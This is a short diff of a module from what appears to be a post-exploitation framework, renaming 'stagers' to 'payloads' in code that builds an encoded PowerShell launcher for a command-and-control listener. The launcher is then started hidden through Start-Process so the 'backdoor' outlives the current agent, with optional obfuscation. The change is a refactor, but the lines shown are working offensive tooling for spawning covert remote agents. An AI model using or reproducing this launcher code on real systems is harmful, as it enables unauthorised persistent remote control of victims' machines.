@@ -83,7 +83,7 @@ class Module:
         sysWow64 = self.options['SysWow64']['Value']
 
         # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+        launcher = self.mainMenu.payloads.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
 
         if launcher == "":
             print helpers.color("[!] Error in launcher command generation.")
@@ -92,11 +92,11 @@ class Module:
             # transform the backdoor into something launched by powershell.exe
             # so it survives the agent exiting  
             if sysWow64.lower() == "true":
-                stagerCode = "$Env:SystemRoot\\SysWow64\\WindowsPowershell\\v1.0\\" + launcher
+                payloadCode = "$Env:SystemRoot\\SysWow64\\WindowsPowershell\\v1.0\\" + launcher
             else:
-                stagerCode = "$Env:SystemRoot\\System32\\WindowsPowershell\\v1.0\\" + launcher
+                payloadCode = "$Env:SystemRoot\\System32\\WindowsPowershell\\v1.0\\" + launcher
 
-            parts = stagerCode.split(" ")
+            parts = payloadCode.split(" ")
 
             code = "Start-Process -NoNewWindow -FilePath \"%s\" -ArgumentList '%s'; 'Agent spawned to %s'" % (parts[0], " ".join(parts[1:]), listenerName)
             if obfuscate:
